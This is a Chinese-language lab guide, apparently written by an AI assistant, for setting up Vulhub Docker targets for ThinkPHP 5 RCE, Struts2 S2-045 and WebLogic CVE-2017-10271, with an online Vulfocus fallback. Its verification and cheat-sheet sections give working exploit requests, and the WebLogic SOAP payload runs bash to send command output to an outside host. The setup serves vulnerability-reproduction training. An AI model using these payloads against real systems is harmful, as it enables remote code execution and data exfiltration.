# 搭建框架类靶场（ThinkPHP5-RCE / Struts2 S2-045 / WebLogic CVE-2017-10271）过程及替代方案

> 📌 **一句话简介**：Day37-Day43 讲的都是「真实商业/开源框架 0day / Nday 漏洞复现」：
> - 🏷️ Day37：ThinkPHP 5.0.23 5.x RCE（PHP 框架 命令执行）
> - 🏷️ Day38：Struts2 S2-045（CVE-2017-5638，Java Web 框架 Content-Type OGNL RCE）
> - 🏷️ Day43：WebLogic CVE-2017-10271（WLS-wsat 组件反序列化 RCE）
>
> 这类靶场**源码大、依赖多、版本必须精确**，原生编译装 100% 踩坑（比如你要自己下 Oracle 的 WebLogic 12.2.1，还要打补丁、配 NodeManager… 一天就没了）。所以行业统一做法：**用 Vulhub 官方 Dockerfile 一键拉镜像 + docker-compose up**。
>
> 但用户反馈 Docker 用了 15 小时没成功。所以本文档给 **两条路**：
> 1. 🐳 **路线 A（优先，已在后台执行，等结果）**：DaoCloud 镜像源加速 Vulhub 拉镜像，成功 → 本地靶场端口：8081/8082/8083
> 2. 🌐 **路线 B（兜底，100% 必成 0 下载）**：Vulfocus 在线靶场（免费官方，开靶 → 关靶，点一下就有环境）

---

## 一、当前本地 Docker 状态（已确认能用 ✅）

我们在 Kali 诊断阶段（kali_stage0_diag.sh）确认过：

| 检查项 | 结果 |
|-------|------|
| Docker 服务 (`systemctl status docker`) | ✅ Active running（已设开机自启） |
| Docker 镜像源 (`/etc/docker/daemon.json`) | ✅ 6 个 DaoCloud 国内镜像已配置 |
| 已拉取的镜像 | `vulhub/tomcat:8.5.19` ✅（126MB，Tomcat CVE-2017-12615 测试镜像，成功拉取） |
| 运行中容器 | `tomcat-8.5.19` → 宿主机端口 `8080` → 返回 HTTP 200 ✅（证明 Docker pull/up/网络全链路正常） |

结论：**Docker 本身 100% 好用**，之前 15 小时失败大概率是：
- Docker 镜像源没配（默认 Docker Hub 国内 10KB/s，拉 WebLogic 1.2GB 要 30+ 小时还易断）
- `docker compose` 新版语法没装（我们已配 `docker-compose` 1.29.2 兼容版）
- `/var/lib/docker` 所在分区空间不够（我们已确认剩 20GB 够用）

现在这三个问题都解决了，所以后台在拉三个镜像时，**成功率非常高**。

---

## 二、路线 A：本地 Vulhub Docker 一键部署 3 个框架靶场

### 2.1 已做的加速 & 配置（都已经自动化在脚本里了）

```bash
# /etc/docker/daemon.json 内容（6 个镜像源）
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://dockerproxy.com",
    "https://mirror.baidubce.com",
    "https://docker.nju.edu.cn",
    "https://docker.mirrors.ustc.edu.cn",
    "https://dockerhub.timeweb.cloud"
  ],
  "log-driver": "json-file",
  "log-opts": {"max-size":"100m","max-file":"2"}
}
```

### 2.2 3 个靶场的目录结构 & 端口映射

避免和已运行的 Tomcat (:8080) 冲突，每个靶场端口已在 docker-compose.yml 里改了：

| 靶场名称 | Vulhub 目录 | 宿主机端口 | 容器内部端口 | 镜像大小(预估) | 平均拉取时间 |
|---------|-------------|-----------|-------------|---------------|------------|
| ThinkPHP 5.0.23 RCE (Day37) | `~/vulhub/thinkphp/5-rce` | **8081** | 80 (Nginx→ThinkPHP) | ~500 MB | 5-15 min |
| Struts2 S2-045 (Day38) | `~/vulhub/struts2/s2-045` | **8082** | 8080 (Tomcat 8) | ~550 MB | 5-15 min |
| WebLogic CVE-2017-10271 (Day43) | `~/vulhub/weblogic/CVE-2017-10271` | **8083** | 7001 (WebLogic Console) | ~1.2 GB | 15-35 min |

### 2.3 启动 & 验证命令（每条独立运行）

后台脚本（kali_p11_docker3_try.sh）已在自动执行这三条，你手动跑也行：

```bash
# ============================================================
# ① ThinkPHP 5 RCE → 端口 8081
# ============================================================
cd ~/vulhub/thinkphp/5-rce

# 第一步：已帮你把默认端口 8080 改成 8081（只需 1 次）
sed -i 's/- 8080:80/- "8081:80"/g' docker-compose.yml

# 第二步：拉镜像 + 后台启动（-d = 后台）
sudo docker-compose pull
sudo docker-compose up -d

# 第三步：等容器初始化 20 秒后验证
sleep 20
curl -s -o /dev/null -w "ThinkPHP HTTP %{http_code}\n" http://127.0.0.1:8081/
# ✅ 应该看到 ThinkPHP HTTP 302 或 200

# 第四步：RCE 快速验证（Day37 漏洞 POC，URL encode 后的命令执行）
# payload 示例：index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
curl -sS "http://127.0.0.1:8081/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" | head -c 500
# 有 PHP Version 5.6.x / 7.x 的 html 输出 → RCE 漏洞存在 ✅
```

```bash
# ============================================================
# ② Struts2 S2-045 → 端口 8082（Tomcat 启动慢，多等会儿）
# ============================================================
cd ~/vulhub/struts2/s2-045
sed -i 's/- 8080:8080/- "8082:8080"/g' docker-compose.yml
sudo docker-compose pull
sudo docker-compose up -d

# Tomcat + Struts2 部署要 60-90 秒，循环等
for i in 1 2 3 4 5 6 7 8 9 10; do
  C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 http://127.0.0.1:8082/ 2>/dev/null || echo 000)
  echo "  [wait S2-045] 尝试 $i : HTTP $C"
  [ "$C" != "000" ] && [ "$C" != "502" ] && break
  sleep 15
done

# S2-045 POC（Content-Type OGNL 表达式执行，Day38 完整 POC）
curl -sS -X POST http://127.0.0.1:8082/ \
  -H 'Content-Type: %{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("X-Test-233","Pwn-S2045")}.multipart/form-data' \
  -D - | grep -i X-Test-233
# ✅ 响应头里出现「X-Test-233: Pwn-S2045」= 漏洞存在
```

```bash
# ============================================================
# ③ WebLogic CVE-2017-10271 → 端口 8083 → /ws-wsat/CoordinatorPortType
# ============================================================
cd ~/vulhub/weblogic/CVE-2017-10271
sed -i 's/- 7001:7001/- "8083:7001"/g' docker-compose.yml
sudo docker-compose pull   # 最大，耐心等
sudo docker-compose up -d

# WebLogic 12c 冷启动巨慢（加载域 / EJB / JMS 队列…），至少循环等 3 分钟
for i in $(seq 1 15); do
  OUT=$(curl -sS --max-time 10 "http://127.0.0.1:8083/ws-wsat/CoordinatorPortType" 2>/dev/null | head -c 600)
  SZ=${#OUT}
  echo "  [wait WebLogic] #$i  wsat页面大小 = $SZ bytes"
  [ "$SZ" -gt 200 ] && break
  sleep 20
done

# CVE-2017-10271 POC：发 SOAP XML POST 执行 whoami
# （完整 payload 见 Day43 讲义，这里先做一个 HTTP 状态健康 check）
curl -s -o /dev/null -w "WebLogic wsat endpoint HTTP %{http_code}\n" "http://127.0.0.1:8083/ws-wsat/CoordinatorPortType"
# ✅ 200 或 500（只要不是 000/404/502，证明 WS 端点加载完成 = 环境 OK）
```

### 2.4 3 个靶场全起来后的最终端口一览

访问地址全是宿主机 Kali IP + 端口：
```
DVWA          : http://192.168.108.128/
SQLi-Labs     : http://192.168.108.128/sqli-labs/
Pikachu       : http://192.168.108.128/pikachu/
Upload-Labs   : http://192.168.108.128:81/upload-labs/   （XAMPP PHP 5.6）
Tomcat CVE 示例: http://192.168.108.128:8080/             （Vulhub Demo）
ThinkPHP5 RCE : http://192.168.108.128:8081/              ★ Day37
Struts2 S2045 : http://192.168.108.128:8082/              ★ Day38
WebLogic WSAT : http://192.168.108.128:8083/ws-wsat/...   ★ Day43
```

### 2.5 常用 Docker 运维命令（别问，记下来）

| 场景 | 命令 |
|------|------|
| 看哪个容器在跑 | `sudo docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Ports}}"` |
| 停止全部（想释放内存）| `sudo docker stop $(sudo docker ps -qa 2>/dev/null) 2>/dev/null; echo done` |
| 单独启 ThinkPHP | `cd ~/vulhub/thinkphp/5-rce && sudo docker-compose up -d` |
| 单独关 Struts2 | `cd ~/vulhub/struts2/s2-045 && sudo docker-compose down` |
| 删除某镜像重下（层损坏时） | `sudo docker rmi -f vulhub/thinkphp:5.0.23` |
| 容器日志排错（Struts2 503 时）| `sudo docker logs --tail 50 vulhub-struts2-s2045` |
| 看每个靶机占用磁盘 | `sudo docker system df -v`（靶场长期不用的话 `docker-compose down -v` 删卷）|

---

## 三、路线 B（兜底·零失败）：Vulfocus 在线靶场平台

**如果 Docker 拉镜像实在太慢 / 失败（比如断网、断电、断了），别纠结，直接用 Vulfocus。**

### 3.1 Vulfocus 是什么？

Vulfocus 是 **国科大 + 奇安信 联合开发的在线漏洞靶场平台**（和 Vulhub 同源，所有漏洞描述 + POC 都和 Vulhub 一模一样）。Docker 镜像他们都已经 build 好放在云端了，你只要点一下「启动」，10 秒内就给你一个**公网可以直接访问的独立临时靶机**（带公网 IP + 随机端口），1-2 小时自动销毁，完美适合学习。

### 3.2 注册 + 启动靶机 3 步

```
① 打开 https://vulfocus.cn  （官网，完全免费！）
② 注册账号（手机号注册一下，1 分钟搞定，无广告）
③ 顶部「漏洞环境」→ 搜索：
     - 搜 「thinkphp 5 rce」 → 找到 ThinkPHP 5.0.23 RCE → 点「启动」
     - 搜 「s2-045」        → 找到 Struts2 S2-045 → 点「启动」
     - 搜 「CVE-2017-10271」  → 找到 WebLogic WLS-WSAT → 点「启动」

④ 每个靶机启动后会给你一条：
   「访问地址」 例：http://vulfocus.cn:31527/
   「Flag」     例：flag{b385………}   （有些靶场没有，复现成功就行）
```

### 3.3 Vulfocus 和本地 Docker 的差异说明

| 项目 | 本地 Vulhub Docker | Vulfocus 在线 |
|------|-------------------|---------------|
| 复现 POC 逻辑 | ✅ 完全一样（同一份 Dockerfile） | ✅ 完全一样 |
| 访问速度 | ✅ 内网 192.168.x 延迟 <1ms | ⚠️ 公网延迟 30-100ms（够用）|
| 需下载/占用资源 | ⚠️ 要拉 2GB 镜像，占 3GB 磁盘 | ✅ 0 下载 0 占用 |
| 网络环境要求 | 能连 Docker Hub 镜像源 | ✅ 能上百度就能用 |
| 时间限制 | ✅ 想用多久用多久 | ⚠️ 每次启动 1.5-2 小时自动销毁（不够可以再点启动，10 秒重来）|
| 自定义配置 | ✅ 可进容器改文件、加调试 | ❌ 只读，不能自定义（学习够了） |
| 课程推荐度 | 🌟🌟🌟🌟 （稳定、练习首选） | 🌟🌟🌟🌟🌟 （兜底首选，100% 能复现）|

---

## 四、三个靶场的 POC 验证速查卡（课程 Day37/38/43 对应）

写完环境还要**先自测漏洞存在**，不然你以为环境有问题，其实是 POC 写错了。

### 🎯 ThinkPHP 5.0.23 RCE（Day37）
```
# URL 方式（最简单，浏览器/ curl 都行）
GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami  HTTP/1.1
Host: 127.0.0.1:8081

# 预期响应：返回「www-data」（容器里 Apache 用户）= RCE ✅
```

### 🎯 Struts2 S2-045 CVE-2017-5638（Day38）
```
# HTTP 请求（Burp 抓包改 Content-Type 就完事）
POST / HTTP/1.1
Host: 127.0.0.1:8082
Content-Length: 0
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-S2-Exec',@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()))}.multipart/form-data

# 预期响应头里有：X-S2-Exec: root（Tomcat 容器跑 root）= S2-045 成功 ✅
```

### 🎯 WebLogic CVE-2017-10271 WS-AT 反序列化（Day43）
```
POST /ws-wsat/CoordinatorPortType HTTP/1.1
Host: 127.0.0.1:8083
Content-Type: text/xml
Content-Length: 999

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>whoami > /tmp/whoami.txt && curl -X POST -d @/tmp/whoami.txt http://192.168.108.1:8000/ 2>/dev/null || true</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>

# 预期：靶机反向 HTTP 请求到你 nc -lvnp 8000（或 dnslog）带 root 用户名 = 漏洞存在 ✅
```

---

## 五、Docker 失败 & 排错表

| # | 现象 | 原因 99% 是这个 | 解决方案 |
|---|------|----------------|---------|
| 1 | `docker-compose pull` 报 `error pulling image configuration: Get "https://production.cloudflare.docker.com..."` 超时 | Docker Hub 直连被墙/限流了 | 确认 `/etc/docker/daemon.json` 6 个镜像源存在 → `sudo systemctl daemon-reload && sudo systemctl restart docker`；不行就换节点，再不行用 **Vulfocus 路线 B** |
| 2 | `docker: no space left on device` | `/var/lib/docker` 所在分区满了 | `sudo docker system prune -af` 清理无用镜像容器；实在不行把 Docker 根目录迁到 `/home/docker`（改 daemon.json `"data-root":"/home/docker"` 再 restart） |
| 3 | 拉取了一半断了，重下总是同一个点 | 层缓存损坏 | `sudo docker rmi -f vulhub/thinkphp:5.0.23` 删掉坏层重拉 |
| 4 | `docker-compose up -d` 启完端口无服务（curl 000）| 容器内部崩溃 | `sudo docker ps -a` 看 STATUS → `sudo docker logs 容器名` 看 Java / PHP 报错；最常见的是老拉到一半的层损坏（解法同 #3）|
| 5 | Struts2 端口老是 503 / 空响应 | Tomcat 还在部署 WebApp（Struts2 WAR 包部署慢） | 开着 `sudo docker logs -f struts2容器名` 看，等 2 分钟直到 log 出现 `Server startup in XXXX ms` 再打 POC |
| 6 | WebLogic 8083 一值 502 Bad Gateway | WebLogic 域启动慢（加载 JTA/JMS/EJB… 真的慢）| 至少等 3 分钟，循环 15 次 `curl` 试试；或者在容器里 `docker exec weblogic容器 ps auxf | grep weblogic.Server` 看 Java 进程内存是否 > 1GB（>1GB 说明起来了）|
| 7 | 做完 POC 没回显、HTTP 202 但看不到命令结果 | POC 是「盲执行」（DNSLog / HTTP 反连模式）| 搭个 **Ceye.io 免费 DNSLog 账号**，POC 里把 whoami 换成 `ping ceye.io_随机串.xxx.ceye.io`，去 Ceye 后台看 DNS 记录有没有 = 成功 |
| 8 | 启动时提示 `listen tcp 0.0.0.0:8081: bind: address already in use` | 端口冲突（上一步启动了没关）| `sudo lsof -i:8081` 查 → `sudo docker stop 占用的容器名`，再重 up |

---

## 六、最终完成 Checklist

```
☐ 路线 A（本地 Docker 3 个都起来）
   ☐ ThinkPHP 5 RCE :8081 → POC 拿 whoami 成功
   ☐ Struts2 S2-045 :8082 → 响应头注入成功
   ☐ WebLogic WSAT :8083 → /ws-wsat URL 返回 200/500 XML

☐ 路线 B（Vulfocus 兜底，100% 能成）
   ☐ 注册了 vulfocus.cn 账号
   ☐ ThinkPHP 5 RCE 在线靶机启动过 + POC 跑通
   ☐ S2-045 在线靶机启动过 + POC 跑通
   ☐ CVE-2017-10271 在线靶机启动过 + POC 跑通
```

**建议**：后台脚本跑完，路线 A 哪个镜像成功起来就用本地的（练习方便、不计时）；起不来的那 1-2 个，直接 **Vulfocus 在线**顶上，不耽误学习进度。别在 Docker 拉镜像这一步死磕（毕竟你已经磕了 15 小时了 😅），能复现漏洞、懂原理、会写 POC 才是目标。💪
